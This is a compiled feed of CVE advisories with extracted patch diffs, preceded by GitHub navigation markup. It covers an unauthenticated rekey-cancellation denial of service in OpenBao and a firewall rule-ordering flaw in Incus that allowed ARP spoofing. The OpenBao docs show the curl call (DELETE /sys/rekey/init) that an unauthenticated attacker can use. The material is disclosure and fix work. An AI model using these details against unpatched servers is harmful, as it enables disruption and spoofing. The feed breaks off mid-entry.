                <li class="HeaderMenu-item position-relative flex-wrap flex-justify-between flex-items-center d-block d-lg-flex flex-lg-nowrap flex-lg-items-center js-details-container js-header-menu-item">
      <button type="button" class="HeaderMenu-link border-0 width-full width-lg-auto px-0 px-lg-2 py-lg-2 no-wrap d-flex flex-items-center flex-justify-between js-details-target" aria-expanded="false">
        Platform
        <svg opacity="0.5" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-chevron-down HeaderMenu-icon ml-1">
    <path d="M12.78 5.22a.749.749 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.06 0L3.22 6.28a.749.749 0 1 1 1.06-1.06L8 8.939l3.72-3.719a.749.749 0 0 1 1.06 0Z"></path>
</svg>
      </button>

      <div class="HeaderMenu-dropdown dropdown-menu rounded m-0 p-0 pt-2 pt-lg-4 position-relative position-lg-absolute left-0 left-lg-n3 dropdown-menu-wide">
        <div class="d-lg-flex dropdown-menu-wide">
            <div class="HeaderMenu-column px-lg-4">
                <div class="">

                  <ul class="list-style-none f5" >
                      <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description mb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;github_copilot&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;github_copilot_link_platform_navbar&quot;}" href="https://github.com/features/copilot">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-copilot color-fg-subtle mr-3">
    <path d="M23.922 16.992c-.861 1.495-5.859 5.023-11.922 5.023-6.063 0-11.061-3.528-11.922-5.023A.641.641 0 0 1 0 16.736v-2.869a.841.841 0 0 1 .053-.22c.372-.935 1.347-2.292 2.605-2.656.167-.429.414-1.055.644-1.517a10.195 10.195 0 0 1-.052-1.086c0-1.331.282-2.499 1.132-3.368.397-.406.89-.717 1.474-.952 1.399-1.136 3.392-2.093 6.122-2.093 2.731 0 4.767.957 6.166 2.093.584.235 1.077.546 1.474.952.85.869 1.132 2.037 1.132 3.368 0 .368-.014.733-.052 1.086.23.462.477 1.088.644 1.517 1.258.364 2.233 1.721 2.605 2.656a.832.832 0 0 1 .053.22v2.869a.641.641 0 0 1-.078.256ZM12.172 11h-.344a4.323 4.323 0 0 1-.355.508C10.703 12.455 9.555 13 7.965 13c-1.725 0-2.989-.359-3.782-1.259a2.005 2.005 0 0 1-.085-.104L4 11.741v6.585c1.435.779 4.514 2.179 8 2.179 3.486 0 6.565-1.4 8-2.179v-6.585l-.098-.104s-.033.045-.085.104c-.793.9-2.057 1.259-3.782 1.259-1.59 0-2.738-.545-3.508-1.492a4.323 4.323 0 0 1-.355-.508h-.016.016Zm.641-2.935c.136 1.057.403 1.913.878 2.497.442.544 1.134.938 2.344.938 1.573 0 2.292-.337 2.657-.751.384-.435.558-1.15.558-2.361 0-1.14-.243-1.847-.705-2.319-.477-.488-1.319-.862-2.824-1.025-1.487-.161-2.192.138-2.533.529-.269.307-.437.808-.438 1.578v.021c0 .265.021.562.063.893Zm-1.626 0c.042-.331.063-.628.063-.894v-.02c-.001-.77-.169-1.271-.438-1.578-.341-.391-1.046-.69-2.533-.529-1.505.163-2.347.537-2.824 1.025-.462.472-.705 1.179-.705 2.319 0 1.211.175 1.926.558 2.361.365.414 1.084.751 2.657.751 1.21 0 1.902-.394 2.344-.938.475-.584.742-1.44.878-2.497Z"></path><path d="M14.5 14.25a1 1 0 0 1 1 1v2a1 1 0 0 1-2 0v-2a1 1 0 0 1 1-1Zm-5 0a1 1 0 0 1 1 1v2a1 1 0 0 1-2 0v-2a1 1 0 0 1 1-1Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">
          GitHub Copilot

        </div>

        Write better code with AI
      </div>

    
</a></li>

                      <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description mb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;github_spark&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;github_spark_link_platform_navbar&quot;}" href="https://github.com/features/spark">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-sparkle-fill color-fg-subtle mr-3">
    <path d="M11.296 1.924c.24-.656 1.168-.656 1.408 0l.717 1.958a11.25 11.25 0 0 0 6.697 6.697l1.958.717c.657.24.657 1.168 0 1.408l-1.958.717a11.25 11.25 0 0 0-6.697 6.697l-.717 1.958c-.24.657-1.168.657-1.408 0l-.717-1.958a11.25 11.25 0 0 0-6.697-6.697l-1.958-.717c-.656-.24-.656-1.168 0-1.408l1.958-.717a11.25 11.25 0 0 0 6.697-6.697l.717-1.958Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">
          GitHub Spark

            <span class="HeaderMenu-label">
              New
            </span>
        </div>

        Build and deploy intelligent apps
      </div>

    
</a></li>

                      <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description mb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;github_models&quot;,&quot;context&quot;:&quot;platform&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;github_models_link_platform_navbar&quot;}" href
... [truncated]

================================================================================


CVE ID: CVE-2025-52894
Published: 2025-06-25T17:15:39.677
Modified: 2025-08-12T20:51:16.360
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

CWE Categories:
  - CWE-20: Improper Input Validation

Description:
OpenBao exists to provide a software solution to manage, store, and distribute sensitive data including secrets, certificates, and keys. OpenBao before v2.3.0 allowed an attacker to perform unauthenticated, unaudited cancellation of root rekey and recovery rekey operations, effecting a denial of service. In OpenBao v2.2.0 and later, manually setting the configuration option `disable_unauthed_rekey_endpoints=true` allows an operator to deny these rarely-used endpoints on global listeners. A patch is available at commit fe75468822a22a88318c6079425357a02ae5b77b. In a future OpenBao release communicated on OpenBao's website, the maintainers will set this to `true` for all users and provide an authenticated alternative. As a workaround, if an active proxy or load balancer sits in front of OpenBao, an operator can deny requests to these endpoints from unauthorized IP ranges.

References (4):
  1. https://github.com/openbao/openbao/commit/fe75468822a22a88318c6079425357a02ae5b77b [Patch]
  2. https://github.com/openbao/openbao/security/advisories/GHSA-prpj-rchp-9j5h [Vendor Advisory]
  3. https://openbao.org/docs/deprecation [Product]
  4. https://openbao.org/docs/deprecation/unauthed-rekey [Product]

Attempting to extract code examples from references...

--- Code from https://github.com/openbao/openbao/commit/fe75468822a22a88318c6079425357a02ae5b77b ---
From fe75468822a22a88318c6079425357a02ae5b77b Mon Sep 17 00:00:00 2001
From: Alexander Scheel <ascheel@gitlab.com>
Date: Wed, 25 Jun 2025 10:01:33 -0500
Subject: [PATCH] Allow disabling unauthenticated rekey (#1496)

OpenBao allows interacting with the rekey root and rekey recovery key
endpoints without authentication. While the rekey itself requires
existing key material to be given on subsequent calls, an
unauthenticated attacker could interrupt any rekey operation by calling
the cancel endpoint (DELETE /sys/rekey/init) before it could be
completed. These interactions were not audited but are going forward.

We add a new option to listeners (disable_unauthed_rekey_endpoints),
allowing disabling rekey operations on a per-listener basis. This would
allow an operator to safely use this operation from localhost or a Unix
socket, but disable it from other global listeners.

In the future when an authenticated variant of the API is available,
this option will be set to true by default, disabling all requests to
this endpoint. Because rekeying is a rarely-used but highly sensitive
operation, the impact should be minimal and the security benefits
outweigh the operational risks.

Please update your configurations accordingly.

Resolves: https://github.com/openbao/openbao/security/advisories/GHSA-prpj-rchp-9j5h

Signed-off-by: Alexander Scheel <ascheel@gitlab.com>
---
 changelog/1496.txt                            |  3 ++
 http/handler.go                               | 24 +++++++++---
 http/sys_metrics_test.go                      | 37 +++++++++++++++++++
 internalshared/configutil/listener.go         |  9 +++++
 .../api-docs/system/rekey-recovery-key.mdx    |  7 ----
 website/content/api-docs/system/rekey.mdx     |  7 ----
 .../docs/configuration/listener/tcp.mdx       | 12 ++++++
 .../docs/configuration/listener/unix.mdx      | 11 ++++++
 website/content/docs/deprecation/index.mdx    |  5 ++-
 .../docs/deprecation/unauthed-rekey.mdx       | 33 +++++++++++++++++
 website/sidebars.ts                           |  2 +-
 11 files changed, 127 insertions(+), 23 deletions(-)
 create mode 100644 changelog/1496.txt
 create mode 100644 website/content/docs/deprecation/unauthed-rekey.mdx

diff --git a/changelog/1496.txt b/changelog/1496.txt
new file mode 100644
index 0000000000..44acd8a965
--- /dev/null
+++ b/changelog/1496.txt
@@ -0,0 +1,3 @@
+```release-note:security
+core/sys: Add listener parameter (`disable_unauthed_rekey_endpoints`, default: `false`) to optionally disable unauthenticated rekey operations (to `sys/rekey/*` and `sys/rekey-recovery-key/*`) for a listener. This will be set to true in a future release; see the [deprecation notice](https://openbao.org/docs/deprecation/unauthed-rekey/) for more information. Auditing is now enabled for these endpoints as well. CVE-2025-52894. Upstream HCSEC-2025-11 / CVE-2025-4656.
+```
diff --git a/http/handler.go b/http/handler.go
index 1ce40ecc6d..437525c660 100644
--- a/http/handler.go
+++ b/http/handler.go
@@ -177,16 +177,28 @@ func handler(props *vault.HandlerProperties) http.Handler {
 		mux.Handle("/v1/sys/leader", handleSysLeader(core))
 		mux.Handle("/v1/sys/health", handleSysHealth(core))
 		mux.Handle("/v1/sys/monitor", handleLogicalNoForward(core))
+
 		mux.Handle("/v1/sys/generate-root/attempt", handleRequestForwarding(core,
 			handleAuditNonLogical(core, handleSysGenerateRootAttempt(core, vault.GenerateStandardRootTokenStrategy))))
 		mux.Handle("/v1/sys/generate-root/update", handleRequestForwarding(core,
 			handleAuditNonLogical(core, handleSysGenerateRootUpdate(core, vault.GenerateStandardRootTokenStrategy))))
-		mux.Handle("/v1/sys/rekey/init", handleRequestForwarding(core, handleSysRekeyInit(core, false)))
-		mux.Handle("/v1/sys/rekey/update", handleRequestForwarding(core, handleSysRekeyUpdate(core, false)))
-		mux.Handle("/v1/sys/rekey/verify", handleRequestForwarding(core, handleSysRekeyVerify(core, false)))
-		mux.Handle("/v1/sys/rekey-recovery-key/init", handleRequestForwarding(core, handleSysRekeyInit(core, true)))
-		mux.Handle("/v1/sys/rekey-recovery-key/update", handleRequestForwarding(core, handleSysRekeyUpdate(core, true)))
-		mux.Handle("/v1/sys/rekey-recovery-key/verify", handleRequestForwarding(core, handleSysRekeyVerify(core, true)))
+
+		// Register without unauthenticated rekey, if necessary.
+		if props.ListenerConfig == nil || !props.ListenerConfig.DisableUnauthedRekeyEndpoints {
+			mux.Handle("/v1/sys/rekey/init", handleRequestForwarding(core,
+				handleAuditNonLogical(core, handleSysRekeyInit(core, false))))
+			mux.Handle("/v1/sys/rekey/update", handleRequestForwarding(core,
+				handleAuditNonLogical(core, handleSysRekeyUpdate(core, false))))
+			mux.Handle("/v1/sys/rekey/verify", handleRequestForwarding(core,
+				handleAuditNonLogical(core, handleSysRekeyVerify(core, false))))
+			mux.Handle("/v1/sys/rekey-recovery-key/init", handleRequestForwarding(core,
+				handleAuditNonLogical(core, handleSysRekeyInit(core, true))))
+			mux.Handle("/v1/sys/rekey-recovery-key/update", handleRequestForwarding(core,
+				handleAuditNonLogical(core, handleSysRekeyUpdate(core, true))))
+			mux.Handle("/v1/sys/rekey-recovery-key/verify", handleRequestForwarding(core,
+				handleAuditNonLogical(core, handleSysRekeyVerify(core, true))))
+		}
+
 		mux.Handle("/v1/sys/storage/raft/bootstrap", handleSysRaftBootstrap(core))
 		mux.Handle("/v1/sys/storage/raft/join", handleSysRaftJoin(core))
 		mux.Handle("/v1/sys/internal/ui/feature-flags", handleSysInternalFeatureFlags(core))
diff --git a/http/sys_metrics_test.go b/http/sys_metrics_test.go
index 46895c7326..d8933518cb 100644
--- a/http/sys_metrics_test.go
+++ b/http/sys_metrics_test.go
@@ -99,3 +99,40 @@ func TestSysPProfUnauthenticated(t *testing.T) {
 	resp = testHttpGet(t, token, addr+"/v1/sys/pprof/cmdline")
 	testResponseStatus(t, resp, 200)
 }
+
+// TestSysRekeyUnauthenticated ensures that unauthenticated endpoints are
+// protected.
+func TestSysRekeyUnauthenticated(t *testing.T) {
+	conf := &vault.CoreConfig{}
+	core, _, token := vault.TestCoreUnsealedWithConfig(t, conf)
+	ln, addr := TestServer(t, core)
+	TestServerAuth(t, addr, token)
+
+	// Default: Allow unauthenticated access
+	resp := testHttpGet(t, "", addr+"/v1/sys/rekey/init")
+	testResponseStatus(t, resp, 200)
+	resp = testHttpGet(t, token, addr+"/v1/sys/rekey/init")
+	testResponseStatus(t, resp, 200)
+
+	// Close listener
+	ln.Close()
+
+	// Setup new custom listener denying unauthenticated rekey access
+	ln, addr = TestListener(t)
+	props := &vault.HandlerProperties{
+		Core: core,
+		ListenerConfig: &configutil.Listener{
+			DisableUnauthedRekeyEndpoints: true,
+		},
+	}
+	TestServerWithListenerAndProperties(t, ln, addr, core, props)
+	defer ln.Close()
+	TestServerAuth(t, addr, token)
+
+	// Testing with and without token should fail; we have completely removed
+	// the endpoint.
+	resp = testHttpGet(t, "", addr+"/v1/sys/rekey/init")
+	testResponseStatus(t, resp, 405)
+	resp = testHttpGet(t, token, addr+"/v1/sys/rekey/init")
+	testResponseStatus(t, resp, 405)
+}
diff --git a/internalshared/configutil/listener.go b/internalshared/configutil/listener.go
index 9fe3666b4e..5bd3605991 100644
--- a/internalshared/configutil/listener.go
+++ b/internalshared/configutil/listener.go
@@ -134,6 +134,15 @@ type Listener struct {
 	// Custom Http response headers
 	CustomResponseHeaders    map[string]map[string]string `hcl:"-"`
 	CustomResponseHeadersRaw interface{}                  `hcl:"custom_response_headers"`
+
+	// Whether to disable responding to unauthenticated rekey endpoints
+	// (via /sys/rekey/* and /sys/rekey-recovery-key/*) on this particular
+	// listener.
+	//
+	// This defaults to false, i.e., respond to requests; in the future when
+	// an authenticated variant with new semantics is available on a new
+	// endpoint, this will be set to true (disabling request handling).
+	DisableUnauthedRekeyEndpoints bool `hcl:"disable_unauthed_rekey_endpoints"`
 }
 
 // AgentAPI allows users to select which parts of the Agent API they want enabled.
diff --git a/website/content/api-docs/system/rekey-recovery-key.mdx b/website/content/api-docs/system/rekey-recovery-key.mdx
index abebff94dc..5dc2ba5100 100644
--- a/website/content/api-docs/system/rekey-recovery-key.mdx
+++ b/website/content/api-docs/system/rekey-recovery-key.mdx
@@ -21,7 +21,6 @@ This endpoint reads the configuration and progress of the current rekey attempt.
 
 ```shell-session
 $ curl \
-    --header "X-Vault-Token: ..." \
     http://127.0.0.1:8200/v1/sys/rekey-recovery-key/init
 ```
 
@@ -104,7 +103,6 @@ nonce.
 
 ```shell-session
 $ curl \
-    --header "X-Vault-Token: ..." \
     --request POST \
     --data @payload.json \
     http://127.0.0.1:8200/v1/sys/rekey-recovery-key/init
@@ -125,7 +123,6 @@ during the verification flow, the current unseal keys remain valid.
 
 ```shell-session
 $ curl \
-    --header "X-Vault-Token: ..." \
     --request DELETE \
     http://127.0.0.1:8200/v1/sys/rekey-recovery-key/init
 ```
@@ -215,7 +212,6 @@ for the verification operation.
 
 ```shell-session
 $ curl \
-    --header "X-Vault-Token" \
     --request POST \
     --data @payload.json \
     http://127.0.0.1:8200/v1/sys/rekey-recovery-key/update
@@ -253,7 +249,6 @@ verification attempt.
 
 ```shell-session
 $ curl \
-    --header "X-Vault-Token: ..." \
     http://127.0.0.1:8200/v1/sys/rekey-recovery-key/verify
 ```
 
@@ -289,7 +284,6 @@ along with the new nonce.
 
 ```shell-session
 $ curl \
-    --header "X-Vault-Token" \
     --request DELETE \
     http://127.0.0.1:8200/v1/sys/rekey-recovery-key/verify
 ```
@@ -342,7 +336,6 @@ below; otherwise the response will be the same as the `GET` method against
 
 ```shell-session
 $ curl \
-    --header "X-Vault-Token" \
     --request POST \
     --data @payload.json \
     http://127.0.0.1:8200/v1/sys/rekey-recovery-key/verify
diff --git a/website/content/api-docs/system/rekey.mdx b/website/content/api-docs/system/rekey.mdx
index f91078c251..0b42c9f586 100644
--- a/website/content/api-docs/system/rekey.mdx
+++ b/website/content/api-docs/system/rekey.mdx
@@ -23,7 +23,6 @@ This endpoint reads the configuration and progress of the current rekey attempt.
 
 ```shell-session
 $ curl \
-    --header "X-Vault-Token: ..." \
     http://127.0.0.1:8200/v1/sys/rekey/init
 ```
 
@@ -105,7 +104,6 @@ and starting a new rekey, which will also provide a new nonce.
 
 ```shell-session
 $ curl \
-    --header "X-Vault-Token: ..." \
     --request POST \
     --data @payload.json \
     http://127.0.0.1:8200/v1/sys/rekey/init
@@ -126,7 +124,6 @@ during the verification flow, the current unseal keys remain valid.
 
 ```shell-session
 $ curl \
-    --header "X-Vault-Token: ..." \
     --request DELETE \
     http://127.0.0.1:8200/v1/sys/rekey/init
 ```
@@ -216,7 +213,6 @@ for the verification operation.
 
 ```shell-session
 $ curl \
-    --header "X-Vault-Token: ..." \
     --request POST \
     --data @payload.json \
     http://127.0.0.1:8200/v1/sys/rekey/update
@@ -254,7 +250,6 @@ verification attempt.
 
 ```shell-session
 $ curl \
-    --header "X-Vault-Token: ..." \
     http://127.0.0.1:8200/v1/sys/rekey/verify
 ```
 
@@ -290,7 +285,6 @@ nonce.
 
 ```shell-session
 $ curl \
-    --header "X-Vault-Token: ..." \
     --request DELETE \
     http://127.0.0.1:8200/v1/sys/rekey/verify
 ```
@@ -343,7 +337,6 @@ below; otherwise the response will be the same as the `GET` method against
 
 ```shell-session
 $ curl \
-    --header "X-Vault-Token: ..." \
     --request POST \
     --data @payload.json \
     http://127.0.0.1:8200/v1/sys/rekey/verify
diff --git a/website/content/docs/configuration/listener/tcp.mdx b/website/content/docs/configuration/listener/tcp.mdx
index 06e3b51d10..1136fbb47b 100644
--- a/website/content/docs/configuration/listener/tcp.mdx
+++ b/website/content/docs/configuration/listener/tcp.mdx
@@ -105,6 +105,18 @@ default value in the `"/sys/config/ui"` [API endpoint](/api-docs/system/config-u
   be comma-delimited if provided as a string. At least one source IP must be provided,
   `proxy_protocol_authorized_addrs` cannot be an empty array or string.
 
+- `disable_unauthed_rekey_endpoints` `(bool: false)` - Whether to disable requests to the
+  legacy unauthenticated rekey endpoints (under `/sys/rekey/*` and
+  `/sys/rekey-recovery-key/*`). These are a security risk to leave exposed on
+  public listeners.
+
+:::warning
+
+**In OpenBao v2.4.0, this parameter will default to true, forbidding any calls
+to the unauthenticated rekey endpoints. This will be a breaking change.
+
+:::
+
 - `tls_disable` `(string: "false")` – Specifies if TLS will be disabled. OpenBao
   assumes TLS by default, so you must explicitly disable TLS to opt-in to
   insecure communication.
diff --git a/website/content/docs/configuration/listener/unix.mdx b/website/content/docs/configuration/listener/unix.mdx
index 0cce61ffa9..9d53b03d29 100644
--- a/website/content/docs/configuration/listener/unix.mdx
+++ b/website/content/docs/configuration/listener/unix.mdx
@@ -27,6 +27,17 @@ multiple sockets.
 
 - `socket_group` `(string: "", <optional>)` – Changes the group owner of the Unix socket.
 
+- `disable_unauthed_rekey_endpoints` `(bool: false)` - Whether to disable requests to the
+  legacy unauthenticated rekey endpoints (under `/sys/rekey/*` and
+  `/sys/rekey-recovery-key/*`). These are a security risk to leave exposed on
+  public listeners.
+
+:::warning
+
+**In OpenBao v2.4.0, this parameter will default to true, forbidding any calls
+to the unauthenticated rekey endpoints. This will be a breaking change.
+
+:::
 
 ## `unix` listener examples
 
diff --git a/website/content/docs/deprecation/index.mdx b/website/content/docs/deprecation/index.mdx
index 69eae46e77..abf2f3333a 100644
--- a/website/content/docs/deprecation/index.mdx
+++ b/website/content/docs/deprecation/index.mdx
@@ -20,6 +20,7 @@ This announcement page is maintained and updated periodically to communicate imp
 
 :::
 
-| Feature                                                                                                                                                                                                                                                                                                                         | Deprecation announcement | End of Support | Feature Removal | Migration Path/Impact                                                                                                                                                                                                                                   | Resources                                         |
-| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------ | -------------- | --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------- |
+| Feature | Deprecation announcement | End of Support | Feature Removal | Migration Path/Impact | Resources |
+| ------- | ------------------------ | -------------- | --------------- | --------------------- | --------- |
 | Configuration of PKCS#11 auto-unseal using the duplicate and undocumented `module`, `token` and `key` options is now deprecated. Use the documented alternative options `lib`, `token_label` and `key_label` instead, respectively. ([More details](https://github.com/openbao/go-kms-wrapping/pull/33#discussion_r2112177962)) | v2.2.2                   | TBD            | No              | Modify your configuration file to use the respective supported option, see [PKCS#11 Unseal](/docs/configuration/seal/pkcs11). Impact is minimal as the deprecated options were undocumented. The switch to the supported options should be trivial.     | [PKCS#11 Unseal](/docs/configuration/seal/pkcs11) |
+| Unauthenticated Rekey & Root Rotation Endpoints | [Link](/docs/deprecation/unauthed-rekey) | v2.4.0 | n/a | Move to future authenticated variants or set `disable_unauthed_rekey_endpoints=false` in listeners explicitly. | [Listener Configuration](https://openbao.org/docs/configuration/listener/) |
diff --git a/website/content/docs/deprecation/unauthed-rekey.mdx b/website/content/docs/deprecation/unauthed-rekey.mdx
new file mode 100644
index 0000000000..15f14b1d25
--- /dev/null
+++ b/website/content/docs/deprecation/unauthed-rekey.mdx
@@ -0,0 +1,33 @@
+---
+sidebar_label: Unauthenticated Rekey Endpoints
+description: |-
+  Deprecating the `sys/rekey/*` and `sys/rekey-recovery-key/*` endpoints.
+---
+
+# Deprecating Unauthenticated Rekey Endpoints
+
+## What
+
+In OpenBao v2.4.0, the `disable_unauthed_rekey_endpoints` parameter will be
+set to `true` by default (currently `false`), preventing all requests to the
+unauthenticated `sys/rekey/*` and `sys/rekey-recovery-key/*` endpoints.
+
+A replacement will be made available ahead of this change landing.
+
+## Why
+
+These endpoints pose a security risk. An unauthenticated attacker may call
+the cancel endpoint (`DELETE /sys/rekey/init` or
+`DELETE /sys/rekey-recovery-key/init`), interrupting a valid rekey operation.
+Additionally, an attacker may choose to initiate their own rekey operation.
+
+Such interaction is not audited and may not result in log messages.
+
+A log line such as:
+
+```
+2025-05-12T14:59:20.819-0500 [INFO]  core: rekey initialized: nonce=592d7982-47aa-b8c9-3d72-b37db72e389f shares=1 threshold=1 validation_required=false
+```
+
+may be visible if an attacker initiated their own rekey operation; this
+operation would not be successful.
diff --git a/website/sidebars.ts b/website/sidebars.ts
index fc57ee66c9..5af91d46c6 100644
--- a/website/sidebars.ts
+++ b/website/sidebars.ts
@@ -478,7 +478,7 @@ const sidebars: SidebarsConfig = {
         },
         "known-issues",
         {
-            "Deprecation Notices": ["deprecation/index", "deprecation/faq"],
+            "Deprecation Notices": ["deprecation/index", "deprecation/faq", "deprecation/unauthed-rekey"],
             Policies: [
                 "policies/index",
                 "policies/brand",


================================================================================


CVE ID: CVE-2025-52893
Published: 2025-06-25T17:15:39.523
Modified: 2025-08-12T20:53:50.083
CVSS Score: 4.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-532: CWE-532

Description:
OpenBao exists to provide a software solution to manage, store, and distribute sensitive data including secrets, certificates, and keys. OpenBao before v2.3.0 may leak sensitive information in logs when processing malformed data. This is separate from the earlier HCSEC-2025-09 / CVE-2025-4166. This issue has been fixed in OpenBao v2.3.0 and later. Like with HCSEC-2025-09, there is no known workaround except to ensure properly formatted requests from all clients.

References (6):
  1. https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-information-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/74717 [Not Applicable]
  2. https://github.com/go-viper/mapstructure/commit/ed3f92181528ff776a0324107b8b55026e93766a [Not Applicable]
  3. https://github.com/go-viper/mapstructure/pull/105 [Not Applicable]
  4. https://github.com/go-viper/mapstructure/releases/tag/v2.3.0 [Not Applicable]
  5. https://github.com/openbao/openbao/commit/cf5e920badbf96b41253534a3fd5ff5063bf4b30 [Patch]
  6. https://github.com/openbao/openbao/security/advisories/GHSA-8f5r-8cmq-7fmq [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-information-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/74717 ---
<code class="lang-auto">{"auth":{"token_type":"default"},"error":"error converting input &lt;sensitive data&gt; for field \"data\": '' expected a map, got 'string'","request":{"client_token":"","client_token_accessor":"","data":{"data":""},"id":"","":"","mount_class":"secret","mount_point":"kv/","mount_type":"kv","mount_running_version":"","namespace":{""},"operation":"update","path":"","remote_address":"","remote_port":},"time":"","type":"request"}


<code class="lang-auto">[ERROR] core: failed to run existence check: error="error converting input &lt;secret data&gt; for field \"data\": '' expected a map, got 'string'"


================================================================================


CVE ID: CVE-2025-52890
Published: 2025-06-25T17:15:39.370
Modified: 2025-06-26T18:57:43.670
CVSS Score: 8.1 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:H

CWE Categories:
  - CWE-863: Incorrect Authorization

Description:
Incus is a system container and virtual machine manager. When using an ACL on a device connected to a bridge, Incus versions 6.12 and 6.13generates nftables rules that partially bypass security options `security.mac_filtering`, `security.ipv4_filtering` and `security.ipv6_filtering`. This can lead to ARP spoofing on the bridge and to fully spoof another VM/container on the same bridge. Commit 254dfd2483ab8de39b47c2258b7f1cf0759231c8 contains a patch for the issue.

References (3):
  1. https://github.com/lxc/incus/commit/254dfd2483ab8de39b47c2258b7f1cf0759231c8
  2. https://github.com/lxc/incus/security/advisories/GHSA-p7fw-vjjm-2rwp
  3. https://github.com/lxc/incus/security/advisories/GHSA-p7fw-vjjm-2rwp

Attempting to extract code examples from references...

--- Code from https://github.com/lxc/incus/commit/254dfd2483ab8de39b47c2258b7f1cf0759231c8 ---
From 254dfd2483ab8de39b47c2258b7f1cf0759231c8 Mon Sep 17 00:00:00 2001
From: Olivier Bal-Petre <olivier.bal-petre@ssi.gouv.fr>
Date: Mon, 2 Jun 2025 11:51:41 +0200
Subject: [PATCH] incusd/firewall/nftables: Fix rule ordering for ARP/NDP
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

Commit d137a063c2fe2a6983c995ba75c03731bee1557d changed the rule
ordering and bypassed some of the MAC/IPv4/IPv6 filtering.

This made possible to ARP spoof another VM/container and fully
spoof it on a bridge.

This is a security fix:

 - CVE-2025-52890
 - GHSA-p7fw-vjjm-2rwp

Signed-off-by: Olivier Bal-Petre <olivier.bal-petre@ssi.gouv.fr>
Acked-by: Stéphane Graber <stgraber@stgraber.org>
---
 .../firewall/drivers/drivers_nftables_templates.go    | 11 +++++++----
 1 file changed, 7 insertions(+), 4 deletions(-)

diff --git a/internal/server/firewall/drivers/drivers_nftables_templates.go b/internal/server/firewall/drivers/drivers_nftables_templates.go
index 2c49329914c..975e68d76b4 100644
--- a/internal/server/firewall/drivers/drivers_nftables_templates.go
+++ b/internal/server/firewall/drivers/drivers_nftables_templates.go
@@ -194,7 +194,6 @@ chain in{{.chainSeparator}}{{.deviceLabel}} {
 
 	# Basic connectivity
 	{{ if or .aclInDropRules .aclInRejectRules .aclInAcceptRules .aclOutDropRules .aclOutAcceptRules .aclInDefaultRule }}
-	ct state established,related accept
 
 	{{ if .dnsIPv4 }}
 	{{ range .dnsIPv4 }}
@@ -213,9 +212,6 @@ chain in{{.chainSeparator}}{{.deviceLabel}} {
 	iifname "{{.hostName}}" ether type ip ip saddr 0.0.0.0 ip daddr 255.255.255.255 udp dport 67 accept
 	iifname "{{.hostName}}" ether type ip6 ip6 saddr fe80::/10 ip6 daddr ff02::1:2 udp dport 547 accept
 	iifname "{{.hostName}}" ether type ip6 ip6 saddr fe80::/10 ip6 daddr ff02::2 icmpv6 type 133 accept
-
-	iifname "{{.hostName}}" ether type arp accept
-	iifname "{{.hostName}}" ip6 nexthdr ipv6-icmp icmpv6 type { nd-neighbor-solicit, nd-neighbor-advert } accept
 	{{ end }}
 
 	# MAC filtering
@@ -248,6 +244,13 @@ chain in{{.chainSeparator}}{{.deviceLabel}} {
 	iifname "{{.hostName}}" ether type ip6 drop
 	{{ end }}
 
+	{{ if or .aclInDropRules .aclInRejectRules .aclInAcceptRules .aclOutDropRules .aclOutAcceptRules .aclInDefaultRule }}
+	ct state established,related accept
+
+	iifname "{{.hostName}}" ether type arp accept
+	iifname "{{.hostName}}" ip6 nexthdr ipv6-icmp icmpv6 type { nd-neighbor-solicit, nd-neighbor-advert } accept
+	{{ end }}
+
 	# ACLs
 	{{ range .aclInDropRules }}
 	{{.}}


================================================================================


CVE ID: CVE-2025-52889
Published: 2025-06-25T17:15:39.200
Modified: 2025-06-26T18:57:43.670
CVSS Score: 3.4 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:N/I:N/A:L

CWE Categories:
  - CWE-770: Allocation of Resources Without Limits or Throttling

Description:
Incus is a system container and virtual machine manager. When using an ACL on a device connected to a bridge, Incus version 6.12 and 6.13 generates nftables rules for local services (DHCP, DNS...) that partially bypass security options `security.mac_filtering`, `security.ipv4_filtering` and `security.ipv6_filtering`. This can lead to DHCP pool exhaustion and opens the door for other attacks. A patch is available at commit 2516fb19ad8428454cb4edfe70c0a5f0dc1da214.

References (4):
